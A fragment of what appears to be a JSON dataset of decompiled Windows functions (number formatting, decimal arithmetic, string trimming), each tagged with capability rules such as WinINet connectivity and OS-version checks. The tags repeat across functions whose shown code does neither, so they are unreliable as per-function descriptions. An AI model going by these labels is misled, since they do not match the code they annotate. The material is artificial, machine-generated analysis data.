        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00463540(uint arg_8h)\n\n{\n    uint *in_EAX;\n    uint32_t uVar1;\n    ushort *puVar2;\n    uint16_t in_CX;\n    int32_t iVar3;\n    uint *in_EDX;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_2ch;\n    char var_ah;\n    char var_9h;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    if ((in_CX == *in_EAX) && (puVar2 = NULL,  (*(in_EAX + 1) & 0x3f) == arg_8h)) {\n        for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *in_EDX = *in_EAX;\n            in_EAX = in_EAX + 1;\n            in_EDX = in_EDX + 1;\n        }\n        *in_EDX = *in_EAX;\n    }\n    else {\n        *in_EDX = in_CX;\n        *(in_EDX + 1) = arg_8h;\n        uVar1 = fcn.004641b4();\n        iVar3 = *in_EAX - (uVar1 & 0xffff);\n        iVar4 = in_CX - arg_8h;\n        if (iVar3 <= iVar4) {\n            var_8h = iVar4 - iVar3;\n        }\n        else {\n            var_8h = iVar3 - iVar4;\n        }\n        var_9h = iVar3 > iVar4;\n        puVar2 = fcn.004641c0();\n        var_ah = puVar2;\n        if (var_8h == 0) {\n            puVar5 = in_EAX + 2;\n            puVar6 = in_EDX + 2;\n            for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar6 = puVar6 + 1;\n            }\n        }\n        else {\n            puVar5 = &var_2ch;\n            for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = *in_EAX;\n                in_EAX = in_EAX + 1;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = *in_EAX;\n            iVar3 = 0x20;\n            puVar2 = in_EDX + 2;\n            do {\n                *puVar2 = 0;\n                puVar2 = puVar2 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n            iVar3 = 0;\n            if (0 < var_8h) {\n                do {\n                    if (var_9h == '\\0') {\n                        uVar1 = var_8h & 0x80000001;\n                        if (uVar1 < 0) {\n                            uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n                        }\n                        if (uVar1 == 0) {\n                            puVar2 = fcn.00463460();\n                            puVar5 = in_EDX;\n                            puVar6 = &var_2ch;\n                            for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar6 = *puVar5;\n                                puVar5 = puVar5 + 1;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = *puVar5;\n                            iVar3 = iVar3 + 1;\n                        }\n                        else {\n                            puVar2 = fcn.004634b8();\n                            puVar5 = in_EDX;\n                            puVar6 = &var_2ch;\n                            for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar6 = *puVar5;\n                                puVar5 = puVar5 + 1;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = *puVar5;\n                        }\n                    }\n                    else {\n                        puVar2 = fcn.00463380();\n                    }\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < var_8h);\n            }\n        }\n        if (var_ah != '\\0') {\n            puVar2 = puVar2 & 0xffffff00 | *(in_EDX + 1) & 0xffffff3f | 0x80;\n            *(in_EDX + 1) = puVar2;\n        }\n    }\n    return puVar2 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1127
    },
    "00463680": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00463680(void)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint8_t *puStack4;\n    \n    uVar1 = *in_EAX;\n    for (puStack4 = in_EAX + 2; (1 < uVar1 && (*puStack4 == 0)); puStack4 = puStack4 + 1) {\n        uVar1 = uVar1 - 2;\n    }\n    return CONCAT44(puStack4, uVar1);\n}\n",
        "token_count": 117
    },
    "004636a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004636a4(uint *param_1, int32_t param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    ushort *puVar2;\n    ushort *puVar3;\n    \n    if (param_2 < *in_EAX) {\n        *param_1 = *in_EAX;\n        *(param_1 + 1) = *(in_EAX + 1);\n        puVar3 = param_1 + 2;\n        fcn.004031a8();\n        for (puVar2 = in_EAX + 2; (param_2 < *param_1 && (*puVar2 == '\\0')); puVar2 = puVar2 + 1) {\n            *param_1 = *param_1 + -2;\n        }\n        fcn.004641b4(puVar2, puVar3);\n        fcn.00402d34();\n    }\n    else {\n        for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *param_1 = *in_EAX;\n            in_EAX = in_EAX + 1;\n            param_1 = param_1 + 1;\n        }\n        *param_1 = *in_EAX;\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "004638ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004638ec(uint param_1, uint8_t *param_2)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t *in_EAX;\n    int32_t iVar3;\n    uint32_t arg_8h;\n    char in_stack_ffffff84;\n    uchar *arg_10h;\n    uint8_t *arg_ch;\n    uint8_t uStack73;\n    uchar auStack71 [6];\n    uchar auStack65 [53];\n    \n    if ((in_EAX[1] & 0x80) == (param_2[1] & 0x80)) {\n        arg_ch = in_EAX + 2;\n        cVar1 = fcn.004630d0(*in_EAX - (in_EAX[1] & 0x3f), arg_ch);\n        arg_8h = *param_2 - (param_2[1] & 0x3f);\n        cVar2 = fcn.004630d0(arg_8h, arg_ch);\n        if (cVar2 == cVar1) {\n            fcn.004637b8(0, auStack65);\n            arg_10h = auStack71;\n            iVar3 = fcn.00463284(uStack73, arg_8h >> 8 & 0xff, arg_10h, &stack0xffffff97);\n            in_stack_ffffff84 = arg_10h;\n        }\n        else if (cVar2 < cVar1) {\n            iVar3 = 1;\n        }\n        else {\n            iVar3 = -1;\n        }\n        if (in_stack_ffffff84 != '\\0') {\n            iVar3 = -iVar3;\n        }\n    }\n    else if ((in_EAX[1] & 0x80) == 0) {\n        iVar3 = 1;\n    }\n    else {\n        iVar3 = -1;\n    }\n    return iVar3;\n}\n",
        "token_count": 427
    },
    "00463b6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00463c74)\n\nvoid __fastcall fcn.00463b6c(uint *param_1, int32_t param_2)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    bool bVar5;\n    uint *puStack88;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_38h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    puStack76 = 0x463b90;\n    var_8h = param_2;\n    fcn.00404a78();\n    puStack76 = 0x463b98;\n    fcn.00404a78();\n    bVar5 = true;\n    uStack80 = 0x463ca2;\n    iStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    fcn.004049d4();\n    if ((bVar5) || (var_8h == 0)) {\n        fcn.0040675c();\n        fcn.00460bc0();\n    }\n    puStack88 = 0x463be6;\n    pcVar1 = fcn.00404a88();\n    bVar5 = *pcVar1 == '-';\n    if (bVar5) {\n        puStack88 = &fcn.00463b6c::var_4h;\n        fcn.00404888();\n        fcn.00404ae8();\n    }\n    pcVar1 = fcn.00404a88();\n    if (*pcVar1 == '-') {\n        bVar5 = !bVar5;\n        fcn.00404888(&fcn.00463b6c::var_8h);\n        fcn.00404ae8();\n    }\n    fcn.00462cd4();\n    fcn.00461790();\n    fcn.00461504();\n    puVar3 = &fcn.00463b6c::var_38h;\n    puVar4 = param_1;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = *puVar3;\n    if (bVar5) {\n        *(param_1 + 1) = *(param_1 + 1) & 0x3f | 0x80;\n    }\n    *in_FS_OFFSET = puStack88;\n    uStack80 = 0x463ca9;\n    iStack84 = 0x463ca1;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 690
    },
    "00463eac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463eac(int32_t arg_8h)\n\n{\n    char in_AL;\n    \n    if ((('\\0' < *(arg_8h + -9)) && (*(arg_8h + -0x10) == *(arg_8h + -9))) ||\n       ((*(arg_8h + -0x10) == 0 && (*(arg_8h + 0xc) != '\\0')))) {\n        if (*(arg_8h + -8) == 0) {\n            fcn.00463e90(arg_8h);\n        }\n        fcn.00463e90(arg_8h);\n    }\n    if ((in_AL != '\\0') || (0 < *(arg_8h + -8))) {\n        fcn.00463e90(arg_8h);\n    }\n    *(arg_8h + -0x10) = *(arg_8h + -0x10) + 1;\n    return;\n}\n",
        "token_count": 214
    },
    "00463f28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463f28(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char in_CL;\n    int16_t in_DX;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_9h;\n    uint var_4h;\n    \n    puStack44 = 0x463f46;\n    iVar2 = fcn.0040881c();\n    uStack48 = 0x464017;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    cVar1 = **0x4847fc;\n    stack0xfffffff4 = 0;\n    puStack44 = &stack0xfffffffc;\n    while (0 < in_DX) {\n        fcn.00463eac(&stack0xfffffffc);\n        if (0 < in_DX) {\n            fcn.00463eac(&stack0xfffffffc);\n        }\n    }\n    while (((('\\0' < in_CL && (in_CL < '\\0')) && (1 < stack0xfffffff4)) && (*(iVar2 + -1 + stack0xfffffff4) == '0'))) {\n        unique0x00007a80 = stack0xfffffff4 + -1;\n        *(iVar2 + unique0x00007a80) = 0;\n    }\n    if (*(iVar2 + -1 + stack0xfffffff4) == cVar1) {\n        unique0x00007a80 = stack0xfffffff4 + -1;\n    }\n    *(iVar2 + stack0xfffffff4) = 0;\n    fcn.004046b8();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x46401e;\n    uStack48 = 0x464016;\n    fcn.00402b44();\n    return;\n}\n",
        "token_count": 434
    },
    "004641c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004641e7)\n// WARNING: Removing unreachable block (ram,0x004641fa)\n\nchar fcn.004641c8(void)\n\n{\n    uint8_t *in_EAX;\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = '\\x01';\n    for (iVar2 = 0; (cVar1 != '\\0' && (iVar2 < *in_EAX >> 1)); iVar2 = iVar2 + 1) {\n        if (in_EAX[iVar2 + 2] != 0) {\n            cVar1 = '\\0';\n        }\n    }\n    if (((cVar1 != '\\0') && ((*in_EAX & 1) != 0)) && (in_EAX[iVar2 + 2] >> 4 != 0)) {\n        cVar1 = '\\0';\n    }\n    return cVar1;\n}\n",
        "token_count": 203
    },
    "004643b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004643b0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    char in_DL;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_114h;\n    uint var_110h;\n    char var_10bh;\n    uint var_10ah;\n    char var_ah;\n    uchar var_9h;\n    int32_t var_8h;\n    char *var_4h;\n    \n    puStack296 = &stack0xfffffffc;\n    uStack300 = 0x464588;\n    iStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    var_8h = 0;\n    var_ah = **0x4847fc;\n    var_9h = **0x484754;\n    fcn.0040461c();\n    arg_8h_00 = 0x464409;\n    var_4h = fcn.00404a88();\n    iVar2 = -1;\n    if (in_DL == '\\x03') {\n        fcn.004047b0();\n        arg_8h_00 = 0x464432;\n        iVar1 = fcn.00404bcc();\n        if (iVar1 < 1) {\n            arg_8h_00 = 0x464445;\n            iVar1 = fcn.00404888();\n        }\n        else {\n            iVar1 = iVar1 + -1;\n        }\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (*var_4h == '-') {\n        arg_8h_00 = &fcn.004643b0::var_8h;\n        fcn.00464338(arg_8h_00);\n        var_4h = var_4h + 1;\n        if (0 < iVar1) {\n            iVar1 = iVar1 + -1;\n        }\n    }\n    while (*var_4h != '\\0') {\n        arg_8h_00 = &fcn.004643b0::var_8h;\n        fcn.00464338(arg_8h_00);\n        if (*var_4h == var_ah) {\n            iVar2 = 0;\n        }\n        else if (-1 < iVar2) {\n            iVar2 = iVar2 + 1;\n        }\n        var_4h = var_4h + 1;\n        if ((3 < iVar1) && (iVar1 = iVar1 + -1,  iVar1 % 3 == 0)) {\n            arg_8h_00 = &fcn.004643b0::var_8h;\n            fcn.00464338(arg_8h_00);\n        }\n    }\n    if (iVar2 == -1) {\n        if (0 < arg_ch) {\n            fcn.00464338(&fcn.004643b0::var_8h);\n        }\n        iVar2 = 0;\n    }\n    for (; iVar2 < arg_ch; iVar2 = iVar2 + 1) {\n        arg_8h_00 = &fcn.004643b0::var_8h;\n        fcn.00464338(arg_8h_00);\n    }\n    if ((&stack0xfffffef1)[var_8h] == var_ah) {\n        var_8h = var_8h + -1;\n    }\n    *(&fcn.004643b0::var_10ah + var_8h) = 0;\n    fcn.004046b8();\n    fcn.00461790();\n    fcn.0040461c();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack300 = 0x46458f;\n    iStack304 = 0x464587;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 872
    },
    "00464bb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464bb0(uint param_1, uint32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    uStack36 = 0x464c8d;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack40;\n    var_4h = *in_EAX;\n    fcn.0040461c();\n    while ((0 < *in_EAX && (*((*param_2 - 2) + *in_EAX) == ' '))) {\n        *in_EAX = *in_EAX + -1;\n        fcn.004048d4();\n    }\n    while ((uVar1 = fcn.00404888(),  var_4h < uVar1 && (uVar1 = *param_2,  *(uVar1 + var_4h) == ' '))) {\n        var_4h = var_4h + 1;\n        fcn.00404890();\n    }\n    fcn.0040dd94(&var_8h, uVar1 & 0xffffff00 | *0x464cb4);\n    uVar1 = fcn.0040461c();\n    arg_8h = &var_ch;\n    fcn.0040dd94(arg_8h, uVar1 & 0xffffff00 | *0x464cb4);\n    fcn.0040461c();\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045ec(0x464c94);\n    return;\n}\n",
        "token_count": 432
    },
    "00464cb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00464cb8(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    \n    if (*in_ECX < 1) {\n        iVar1 = fcn.00404888();\n        *in_EDX = iVar1;\n        *arg_8h = *in_EDX;\n        *in_ECX = 0;\n    }\n    else {\n        *arg_8h = *in_ECX + -1;\n        iVar1 = fcn.00404888();\n        *in_EDX = iVar1 + -1;\n        iVar1 = fcn.00404888();\n        *in_ECX = iVar1 - *in_ECX;\n    }\n    return;\n}\n",
        "token_count": 173
    },
    "00464dc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464dc8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY56;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack32 = 0x464e65;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    if (param_2 == 1) {\n        puStack28 = &stack0xfffffffc;\n        fcn.004048d4();\n    }\n    else {\n        iVar1 = fcn.00404888();\n        if (param_2 < iVar1) {\n            fcn.00404ae8(&var_4h);\n            fcn.00404888(&var_8h, param_1, var_4h);\n            fcn.00404ae8();\n            uStackY56 = var_8h;\n            fcn.00404948();\n        }\n        else {\n            fcn.00404890();\n        }\n    }\n    *in_FS_OFFSET = uStackY56;\n    fcn.004045ec(0x464e6c);\n    return;\n}\n",
        "token_count": 310
    },
    "00464f5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00464f5c(void)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint32_t in_EAX;\n    uint32_t arg_ch;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    char *var_ch;\n    char *var_8h;\n    uint32_t var_4h;\n    \n    var_18h = 0;\n    var_14h = 0;\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    bVar2 = false;\n    var_4h = in_EAX;\n    var_8h = fcn.00404a88();\n    var_10h = 0;\n    iVar3 = 0;\n    fcn.004045c8();\n    do {\n        if (*var_8h == '\\0') {\n            iVar3 = *(var_4h + 8);\n            if (-1 < iVar3 + -1) {\n                do {\n                    arg_ch = var_4h & 0xffffff00 | *0x4650c8;\n                    arg_8h = &var_18h;\n                    fcn.0041c4c8();\n                    fcn.0040dd94(arg_8h, arg_ch);\n                    var_4h = fcn.0040461c();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            *in_FS_OFFSET = arg_8h;\n            fcn.004045ec();\n            return;\n        }\n        iVar4 = iVar3;\n        if ((*var_8h == '\\\"') || (*var_8h == '\\'')) {\n            bVar2 = bVar2 ^ 1;\n        }\n        else {\n            cVar1 = *var_8h;\n            if ((((cVar1 != '#') && (cVar1 != ',')) && (cVar1 != '.')) && (cVar1 != '0')) {\n                var_ch = var_8h;\n                do {\n                    if ((!bVar2) &&\n                       (((cVar1 = *var_8h,  cVar1 == '#' || (cVar1 == ',')) || ((cVar1 == '.' || (cVar1 == '0'))))))\n                    goto code_r0x00465008;\n                    var_8h = var_8h + 1;\n                    iVar4 = iVar4 + 1;\n                } while (((*var_8h != '\\\"') && (*var_8h != '\\'')) && (*var_8h != '\\0'));\n                bVar2 = false;\ncode_r0x00465008:\n                var_10h = iVar3;\n                fcn.004046b8();\n            }\n        }\n        if ((!bVar2) && (var_14h != 0)) {\n            fcn.00464ee0(var_10h);\n            fcn.0041c358();\n            fcn.004045c8();\n        }\n        if (*var_8h != '\\0') {\n            var_8h = var_8h + 1;\n        }\n        iVar3 = iVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 732
    },
    "004650cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004650cc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_10h = 0;\n    var_14h = 0;\n    uStack44 = 0x4651fb;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    var_4h = in_EAX;\n    iVar1 = fcn.00404888();\n    var_8h = fcn.00404888();\n    var_8h = (iVar1 + 1) - var_8h;\n    if (var_8h < 0) {\n        var_8h = 0;\n    }\n    iVar1 = *(var_4h + 8);\n    if (-1 < *(var_4h + 8) + -1) {\n        do {\n            var_ch = iVar1;\n            iVar1 = fcn.0041c4c8();\n            iVar1 = *(iVar1 + 8);\n            if (iVar1 == 0) {\n                fcn.0041c4c8();\n                fcn.004048d4();\n            }\n            else {\n                iVar2 = fcn.00404888();\n                if (var_8h + iVar1 < iVar2) {\n                    fcn.00404ae8(&fcn.004650cc::var_10h);\n                    iVar1 = fcn.0041c4c8(var_10h);\n                    fcn.00404888(&fcn.004650cc::var_14h, *(iVar1 + 4));\n                    fcn.00404ae8();\n                    uStack48 = var_14h;\n                    fcn.00404948();\n                }\n                else {\n                    fcn.0041c4c8();\n                    fcn.00404890();\n                }\n            }\n            fcn.0041c4c8();\n            fcn.00403820();\n            var_ch = var_ch + -1;\n            iVar1 = var_ch;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x465202;\n    uStack44 = 0x4651fa;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 579
    },
    "0046520c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046520c(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uchar uVar6;\n    uint *in_stack_ffffff5c;\n    int32_t iStack136;\n    uint uStack132;\n    uchar *puStack128;\n    int32_t iStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_46h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    char var_17h;\n    uchar var_16h;\n    char var_15h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack116 = &stack0xfffffffc;\n    var_60h = 0;\n    var_5ch = 0;\n    var_58h = 0;\n    var_54h = 0;\n    var_50h = 0;\n    var_4ch = 0;\n    var_14h = 0;\n    var_1ch = 0;\n    var_20h = 0;\n    puVar5 = &fcn.0046520c::var_46h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = *param_2;\n        param_2 = param_2 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = *param_2;\n    uStack120 = 0x4654e1;\n    iStack124 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff84;\n    puStack128 = 0x46525c;\n    fcn.004045c8();\n    puStack128 = 0x465268;\n    var_24h = fcn.004037f0();\n    uStack132 = 0x4654aa;\n    iStack136 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff78;\n    puStack128 = &stack0xfffffffc;\n    fcn.00404660();\n    var_10h = fcn.00404bcc();\n    if (0 < var_10h) {\n        fcn.00464bb0();\n    }\n    fcn.00464f5c();\n    uVar3 = fcn.00404bcc();\n    var_17h = 0 < uVar3;\n    if (var_17h) {\n        fcn.0040dd94(&fcn.0046520c::var_4ch, uVar3 & 0xffffff00 | *0x465508);\n        fcn.00404660();\n    }\n    fcn.004047b0();\n    var_8h = fcn.00404bcc();\n    fcn.00464cb8(&fcn.0046520c::var_ch);\n    iVar4 = fcn.00404bcc();\n    if ((iVar4 < 1) || (var_ch <= iVar4)) {\n        cVar2 = '\\0';\n    }\n    else {\n        cVar2 = '\\x01';\n    }\n    fcn.00404ae8(&fcn.0046520c::var_54h);\n    iVar4 = fcn.00404bcc();\n    var_16h = 0 < iVar4;\n    if (var_17h == '\\0') {\n        if (!var_16h) {\n            uVar3 = fcn.004641b4();\n            if ((uVar3 & 0xffff) <= var_8h) {\n                var_15h = '\\0';\n                goto code_r0x0046538a;\n            }\n        }\n        var_15h = '\\x02';\n    }\n    else {\n        var_15h = '\\x03';\n    }\ncode_r0x0046538a:\n    fcn.0046434c(param_1);\n    cVar1 = fcn.004641c0();\n    if (cVar1 != '\\0') {\n        uVar3 = fcn.00404660();\n        in_stack_ffffff5c = &fcn.0046520c::var_58h;\n        fcn.0040dd94(in_stack_ffffff5c, uVar3 & 0xffffff00 | *0x465508);\n        fcn.0040461c();\n        var_10h = var_10h + 1;\n    }\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.00464d04();\n    }\n    uVar6 = var_15h == '\\0';\n    if (!uVar6) {\n        fcn.004643b0(&fcn.0046520c::var_5ch, var_8h);\n        fcn.0040461c();\n    }\n    fcn.004049d4();\n    if (uVar6) {\n        fcn.004045c8();\n    }\n    if (cVar2 == '\\0') {\n        iVar4 = fcn.00404bcc();\n        if (iVar4 == -1) {\n            fcn.004048d4();\n        }\n    }\n    else {\n        fcn.00404888(&fcn.0046520c::var_60h, 0x465514, var_1ch);\n        fcn.00404ae8();\n        fcn.00404948(var_60h);\n    }\n    if (var_14h != 0) {\n        fcn.00464dc8();\n    }\n    fcn.004650cc();\n    *in_FS_OFFSET = in_stack_ffffff5c;\n    fcn.00403820(0x4654b1);\n    return;\n}\n",
        "token_count": 1350
    },
    "00465524": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
